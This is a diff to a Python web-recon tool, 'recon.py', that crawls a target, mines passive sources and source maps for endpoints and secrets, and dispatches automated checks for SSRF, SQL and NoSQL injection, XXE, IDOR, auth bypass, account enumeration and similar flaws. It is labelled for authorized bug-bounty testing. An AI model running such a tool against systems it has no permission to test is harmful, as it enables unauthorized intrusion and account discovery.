-        print(f"\n{c}{BD}━━ {tag} — {TAGS[tag]} ({len(eps)} endpoints) ━━{R}")
+    # Remaining
+    remaining = [ep for ep in sorted_eps if ep.url not in printed_urls]
+    if remaining:
+        print(f"\n{BOLD}{DIM}══ OTHER DISCOVERED ENDPOINTS ══{RST}")
+        for ep in remaining[:30]:
+            _print_endpoint(ep)
 
-        for ep in sorted(eps, key=lambda e: e.status in (200,201), reverse=True)[:15]:
-            s_col = GN if ep.status in (200,201) else (YL if ep.status in (403,405) else CY)
-            auth_str = f"  {RD}{BD}[NO AUTH]{R}" if ep.requires_auth is False else ""
-            methods_str = f"  [{','.join(ep.methods)}]" if ep.methods else ""
-            print(f"  {s_col}{ep.status or '???'}{R}  /{ep.path}{methods_str}{auth_str}")
-            for note in ep.notes[:2]:
-                print(f"         {CY}↳ {note}{R}")
-            total_exploitable += 1
-
-        print(f"\n  {MG}Next steps:{R}")
-        for s in ATTACK_NEXT_STEPS.get(tag, []):
-            print(f"    → {s}")
-
-        report["by_attack_class"][tag] = [
-            {"path": ep.path, "status": ep.status, "methods": ep.methods,
-             "notes": ep.notes, "requires_auth": ep.requires_auth}
-            for ep in eps
-        ]
-
-    print(f"\n{YL}{BD}━━ ALL ENDPOINTS ({len(endpoints)} total) ━━{R}")
-    for ep in endpoints[:100]:
-        tags_str = ",".join(sorted(ep.tags)) if ep.tags else "-"
-        auth_str = " \U0001f513" if ep.requires_auth is False else ""
-        s_col = GN if ep.status in (200,201) else (YL if ep.status in (301,302,403,405) else CY)
-        print(f"  {s_col}{ep.status or '?'}{R}  /{ep.path:<55}  [{tags_str}]{auth_str}")
-
-    print(f"\n  {GN}Total endpoints discovered: {len(endpoints)}{R}")
-    print(f"  {RD}High-value attack surfaces: {total_exploitable}{R}\n")
-
-    if out_file:
-        report["endpoints"] = [
-            {"path": ep.path, "url": ep.url, "status": ep.status,
-             "methods": ep.methods, "tags": list(ep.tags),
-             "notes": ep.notes, "requires_auth": ep.requires_auth,
-             "source": ep.source}
-            for ep in endpoints
-        ]
-        with open(out_file, "w") as f:
-            json.dump(report, f, indent=2)
-        ok(f"Report saved to {out_file}")
+    print(f"\n{DIM}{'─'*70}{RST}\n")
 
 
-# ── Orchestrator ────────────────────────────────────────────────────────────────────────────
+def _print_endpoint(ep: Endpoint) -> None:
+    status_color = G if ep.status in (200, 201) else (Y if ep.status in (301, 302, 307, 308) else (R if ep.status in (500, 502) else DIM))
+    auth_indicator = f" {R}[NO AUTH]{RST}" if ep.requires_auth is False else (" {DIM}[AUTH]{RST}" if ep.requires_auth else "")
+    tags_str = " ".join(color_tag(t) for t in sorted(ep.tags)) if ep.tags else ""
+    methods_str = f" {DIM}[{','.join(ep.methods)}]{RST}" if ep.methods else ""
+    print(f"  {status_color}{ep.status or '???'}{RST} {W}{ep.url}{RST}{auth_indicator}{methods_str}")
+    if tags_str:
+        print(f"       {tags_str}")
+    for note in ep.notes[:4]:
+        print(f"       {DIM}→ {note}{RST}")
+    if ep.redirect_to:
+        print(f"       {DIM}↳ {ep.redirect_to}{RST}")
+    print()
 
-async def run(base: str, concurrency: int = 40, out_file: str | None = None,
-              skip_enum: bool = False, skip_verbs: bool = False):
-    if not base.startswith(("http://","https://")):
-        print("Invalid URL — must start with http:// or https://")
-        sys.exit(1)
 
-    print(f"\n{'━'*70}")
-    print(f"  TARGET : {base}")
-    print(f"  ⚠  AUTHORIZED USE ONLY — bug bounty / owned target")
-    print(f"{'━'*70}\n")
+# ── Output formats ────────────────────────────────────────────────────────────
 
-    connector = aiohttp.TCPConnector(ssl=False, limit=concurrency)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        http = HTTP(base, session)
-        start = time.monotonic()
+def save_json(endpoints: List[Endpoint], path: str):
+    data = []
+    for ep in sorted(endpoints, key=score, reverse=True):
+        data.append({
+            "url": ep.url, "path": ep.path, "status": ep.status,
+            "methods": ep.methods, "tags": sorted(ep.tags),
+            "notes": ep.notes, "requires_auth": ep.requires_auth,
+            "source": ep.source, "content_type": ep.content_type,
+            "body_sample": ep.body_sample[:200],
+            "redirect_to": ep.redirect_to, "params": ep.params,
+            "score": score(ep),
+        })
+    with open(path, "w") as f:
+        json.dump(data, f, indent=2)
+    print(f"{G}JSON saved:{RST} {path}")
 
-        passive_paths  = await phase_passive(http)
-        crawl_paths    = await phase_crawl(http)
-        wordlist_eps   = await phase_wordlist(http,
-                                               extra_paths=passive_paths + crawl_paths,
-                                               concurrency=concurrency)
-        spec_eps       = await phase_spec(http)
 
-        all_eps = triage(wordlist_eps + spec_eps)
+def save_csv(endpoints: List[Endpoint], path: str):
+    with open(path, "w", newline="") as f:
+        w = csv.writer(f)
+        w.writerow(["score", "url", "status", "tags", "requires_auth", "source", "notes"])
+        for ep in sorted(endpoints, key=score, reverse=True):
+            w.writerow([score(ep), ep.url, ep.status, "|".join(sorted(ep.tags)),
+                        ep.requires_auth, ep.source, " | ".join(ep.notes[:3])])
+    print(f"{G}CSV saved:{RST} {path}")
 
-        crawl_set = {ep.path for ep in all_eps}
-        for p in crawl_paths:
-            p = p.strip("/")
-            if p and p not in crawl_set:
-                all_eps.append(Endpoint(url=http.abs(p), path=p, status=0,
-                                        tags=tag_from_path(p), source="crawl"))
 
-        all_eps = triage(all_eps)
+def save_markdown(endpoints: List[Endpoint], tech: Set[str], target: str, path: str):
+    lines = [f"# Recon Report: {target}\n\n"]
+    lines.append(f"**Date:** {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}  \n")
+    lines.append(f"**Technology:** {', '.join(sorted(tech)) or 'Unknown'}  \n")
+    lines.append(f"**Endpoints:** {len(endpoints)}  \n\n")
+    lines.append("## High-Priority Findings\n\n")
+    lines.append("| Score | Status | URL | Tags | Notes |\n")
+    lines.append("|-------|--------|-----|------|-------|\n")
+    for ep in sorted(endpoints, key=score, reverse=True)[:50]:
+        tags = ", ".join(sorted(ep.tags))
+        notes = "; ".join(ep.notes[:2])
+        lines.append(f"| {score(ep)} | {ep.status} | `{ep.url}` | {tags} | {notes} |\n")
+    lines.append("\n## All Endpoints\n\n")
+    for ep in sorted(endpoints, key=score, reverse=True):
+        lines.append(f"### `{ep.path}` ({ep.status})\n")
+        if ep.tags:
+            lines.append(f"**Tags:** {', '.join(sorted(ep.tags))}  \n")
+        if ep.requires_auth is False:
+            lines.append("**Auth required:** NO ⚠️  \n")
+        for note in ep.notes:
+            lines.append(f"- {note}\n")
+        lines.append("\n")
+    with open(path, "w") as f:
+        f.writelines(lines)
+    print(f"{G}Markdown saved:{RST} {path}")
 
-        if not skip_enum:
-            await phase_account_enum(http, all_eps)
-        await phase_auth_map(http, all_eps)
-        if not skip_verbs:
-            await phase_verbs(http, all_eps)
 
-        elapsed = time.monotonic() - start
-        print(f"\n  Elapsed: {elapsed:.1f}s")
+# ── Main ──────────────────────────────────────────────────────────────────────
 
-        print_report(all_eps, base, out_file)
-        return all_eps
+async def run(args):
+    banner()
+    base = args.target.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+    host = extract_host(base)
 
+    conn = aiohttp.TCPConnector(ssl=False, limit=args.concurrency + 10)
+    default_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+    }
+    if args.headers:
+        default_headers.update(json.loads(args.headers))
+    if args.cookies:
+        default_headers["Cookie"] = args.cookies
+
+    proxy = args.proxy or None
+    timeout = aiohttp.ClientTimeout(total=30)
+
+    async with aiohttp.ClientSession(connector=conn, headers=default_headers) as session:
+        sem = asyncio.Semaphore(args.concurrency)
+        http = HTTP(sem, session, verbose=args.verbose, delay=args.delay)
+
+        all_endpoints: List[Endpoint] = []
+        sourcemap_secrets: List[str] = []
+
+        # ── Phase 0: Fingerprint ──────────────────────────────────────────────
+        print(f"{BOLD}{B}[Phase 0] Technology Fingerprinting{RST}")
+        forced_tech = set(args.tech.split(",")) if args.tech else set()
+        tech = await fingerprint(http, base)
+        tech.update(forced_tech)
+
+        # ── Phase 1: Passive recon ────────────────────────────────────────────
+        passive_subdomains: List[str] = []
+        if not args.no_passive:
+            print(f"\n{BOLD}{B}[Phase 1] Passive Recon{RST}")
+            tasks = [
+                passive_wayback(http, host),
+                passive_urlscan(http, host),
+                passive_commoncrawl(http, host),
+                passive_otx(http, host),
+                passive_crtsh(http, host),
+            ]
+            results = await asyncio.gather(*tasks)
+            wayback_urls, urlscan_urls, cc_urls, otx_urls, subdomains = results
+            passive_subdomains = subdomains
+
+            # Deduplicate and extract paths from passive URLs
+            passive_paths = set()
+            for url_list in [wayback_urls, urlscan_urls, cc_urls, otx_urls]:
+                for u in url_list:
+                    try:
+                        p = urllib.parse.urlparse(u)
+                        if p.hostname and host in p.hostname:
+                            path = p.path.lstrip("/")
+                            if path:
+                                passive_paths.add(path)
+                    except Exception:
+                        pass
+            print(f"  {G}Passive paths extracted:{RST} {len(passive_paths)}")
+
+            # Probe passive paths
+            if passive_paths:
+                passive_eps = await probe_paths(http, base, list(passive_paths)[:1000])
+                all_endpoints.extend(passive_eps)
+                print(f"  {G}Passive endpoints found:{RST} {len(passive_eps)}")
+
+        # ── Phase 2: Active crawl ─────────────────────────────────────────────
+        if not args.passive_only:
+            print(f"\n{BOLD}{B}[Phase 2] Active Crawl (depth={args.depth}){RST}")
+            crawl_paths, sourcemap_urls = await crawl(http, base, depth=args.depth)
+            print(f"  Crawl found {len(crawl_paths)} paths, {len(sourcemap_urls)} source maps")
+
+            for sm_url in sourcemap_urls[:10]:
+                sm_paths, sm_secrets = await fetch_sourcemap(http, sm_url)
+                crawl_paths.extend(sm_paths)
+                sourcemap_secrets.extend(sm_secrets)
+                if sm_secrets:
+                    print(f"  {R}Source map secrets:{RST} {sm_url}")
+
+            crawl_eps = await probe_paths(http, base, crawl_paths)
+            all_endpoints.extend(crawl_eps)
+            print(f"  {G}Crawl endpoints found:{RST} {len(crawl_eps)}")
+
+        # ── Phase 3: Wordlist ─────────────────────────────────────────────────
+        if not args.passive_only:
+            print(f"\n{BOLD}{B}[Phase 3] Wordlist Probing{RST}")
+            wordlist = build_wordlist(tech)
+            print(f"  Probing {len(wordlist)} paths...")
+            wl_eps = await probe_paths(http, base, wordlist)
+            all_endpoints.extend(wl_eps)
+            print(f"  {G}Wordlist endpoints found:{RST} {len(wl_eps)}")
+
+        # ── Phase 4: Spec parsing ─────────────────────────────────────────────
+        print(f"\n{BOLD}{B}[Phase 4] Spec & Schema Parsing{RST}")
+        spec_eps = await parse_openapi(http, base)
+        gql_eps = await parse_graphql(http, base)
+        all_endpoints.extend(spec_eps)
+        all_endpoints.extend(gql_eps)
+
+        # ── Deduplicate ───────────────────────────────────────────────────────
+        seen_urls: Set[str] = set()
+        unique_eps: List[Endpoint] = []
+        for ep in all_endpoints:
+            if ep.url not in seen_urls:
+                seen_urls.add(ep.url)
+                unique_eps.append(ep)
+        all_endpoints = unique_eps
+        print(f"\n  {G}Total unique endpoints:{RST} {len(all_endpoints)}")
+
+        # ── Phase 5: Auth boundary ────────────────────────────────────────────
+        print(f"\n{BOLD}{B}[Phase 5] Auth Boundary Mapping{RST}")
+        await map_auth_boundary(http, all_endpoints)
+        unauthed = sum(1 for ep in all_endpoints if ep.requires_auth is False)
+        print(f"  {R}Accessible without auth:{RST} {unauthed}")
+
+        # ── Phase 6: Exploit triage ───────────────────────────────────────────
+        if not args.no_triage:
+            print(f"\n{BOLD}{B}[Phase 6] Exploit Triage{RST}")
+
+            triage_tasks = []
+            for ep in all_endpoints:
+                if ep.status in (200, 201, 204, 301, 302, 307, 308, 403, 405):
+                    triage_tasks.append(_triage_endpoint(http, ep, args))
+
+            await asyncio.gather(*triage_tasks)
+
+        # ── Phase 7: Verb tampering ───────────────────────────────────────────
+        if not args.no_verbs:
+            print(f"\n{BOLD}{B}[Phase 7] HTTP Verb Enumeration{RST}")
+            high_val = [ep for ep in all_endpoints
+                        if ep.tags & {"ADMIN", "IDOR", "AUTH_BYPASS", "BUSINESS_LOGIC"}][:30]
+            await asyncio.gather(*[triage_verb_tamper(http, ep) for ep in high_val])
+            print(f"  Checked verbs on {len(high_val)} high-value endpoints")
+
+        # ── Output ────────────────────────────────────────────────────────────
+        print_report(all_endpoints, tech, passive_subdomains, sourcemap_secrets)
+
+        if args.output:
+            save_json(all_endpoints, args.output)
+        if args.csv:
+            save_csv(all_endpoints, args.csv)
+        if args.md:
+            save_markdown(all_endpoints, tech, base, args.md)
+
+        return all_endpoints
+
+
+async def _triage_endpoint(http: HTTP, ep: Endpoint, args) -> None:
+    tasks = [triage_cors(http, ep), triage_jwt(ep)]
+
+    if not args.no_enum and any(k in ep.path.lower() for k in
+                                 ["login", "signin", "sign-in", "auth", "token", "session"]):
+        tasks.append(triage_account_enum(http, ep.url, ep))
+        tasks.append(triage_rate_limit(http, ep))
+        tasks.append(triage_nosql(http, ep))
+
+    if "SSRF" in ep.tags or any(k in ep.path.lower() for k in ["fetch", "proxy", "webhook", "url", "forward"]):
+        tasks.append(triage_ssrf(http, ep))
+
+    if "OPEN_REDIRECT" in ep.tags or any(k in ep.path.lower() for k in ["redirect", "return", "next", "goto"]):
+        tasks.append(triage_open_redirect(http, ep))
+
+    if "HOST_HEADER" in ep.tags or any(k in ep.path.lower() for k in ["reset", "password", "forgot"]):
+        tasks.append(triage_host_header(http, ep))
+
+    if ep.status in (200, 201) and any(t in ep.tags for t in ["ADMIN", "IDOR", "INFO_DISC"]):
+        tasks.append(triage_auth_bypass(http, ep))
+
+    if "IDOR" in ep.tags:
+        tasks.append(triage_idor(http, ep))
+
+    if ep.status in (200, 201) and any(t in ep.tags for t in ["MASS_ASSIGN", "ADMIN"]):
+        tasks.append(triage_mass_assignment(http, ep))
+
+    if "XXE" in ep.tags or "FILE_OPS" in ep.tags:
+        tasks.append(triage_xxe(http, ep))
+
+    if "SQLI" in ep.tags or "INJECTION" in ep.tags:
+        tasks.append(triage_sql_injection(http, ep))
+
+    if ep.status in (200, 201):
+        tasks.append(triage_cache_poison(http, ep))
+
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+
+# ── CLI ───────────────────────────────────────────────────────────────────────
 
 def main():
-    import argparse
-    p = argparse.ArgumentParser(
-        description="recon.py — Endpoint discovery & exploit-relevance triage\n"
-                    "Authorized testing only (bug bounty / owned target).",
-        formatter_class=argparse.RawTextHelpFormatter,
+    ap = argparse.ArgumentParser(
+        description="Maximum-coverage endpoint discovery & exploit triage — authorized targets only",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    p.add_argument("url",                   help="Target base URL  e.g. https://target.example.com")
-    p.add_argument("-c","--concurrency",    type=int, default=40,
-                   help="Concurrent requests (default 40)")
-    p.add_argument("-o","--output",         default=None,
-                   help="Save JSON report to file")
-    p.add_argument("--no-enum",             action="store_true",
-                   help="Skip account enumeration probes")
-    p.add_argument("--no-verbs",            action="store_true",
-                   help="Skip HTTP verb enumeration")
-    args = p.parse_args()
-    asyncio.run(run(args.url, concurrency=args.concurrency,
-                    out_file=args.output,
-                    skip_enum=args.no_enum,
-                    skip_verbs=args.no_verbs))
+    ap.add_argument("target", help="Target base URL (e.g. https://target.example.com)")
+    ap.add_argument("-c", "--concurrency", type=int, default=40)
+    ap.add_argument("-o", "--output", help="JSON output file")
+    ap.add_argument("--md", help="Markdown report file")
+    ap.add_argument("--csv", help="CSV output file")
+    ap.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth (default 3)")
+    ap.add_argument("--delay", type=int, default=0, help="Delay between requests in ms")
+    ap.add_argument("--passive-only", action="store_true", help="Passive recon only (no wordlist/crawl)")
+    ap.add_argument("--no-passive", action="store_true", help="Skip passive sources")
+    ap.add_argument("--no-enum", action="store_true", help="Skip account enumeration")
+    ap.add_argument("--no-verbs", action="store_true", help="Skip verb enumeration")
+    ap.add_argument("--no-cors", action="store_true", help="Skip CORS testing")
+    ap.add_argument("--no-triage", action="store_true", help="Discovery only")
+    ap.add_argument("--tech", default="", help="Force technology (comma-separated: spring,laravel,django,rails,express,wordpress,drupal)")
+    ap.add_argument("--cookies", default="", help="Cookies (name=value; name2=value2)")
+    ap.add_argument("--headers", default="", help="Extra headers as JSON string")
+    ap.add_argument("--proxy", default="", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
+    ap.add_argument("-v", "--verbose", action="store_true")
+    args = ap.parse_args()
+
+    print(f"{Y}Target:{RST} {args.target}")
+    print(f"{Y}Authorization:{RST} Running against authorized targets only (bug bounty / owned)\n")
+
+    asyncio.run(run(args))
 
 
 if __name__ == "__main__":
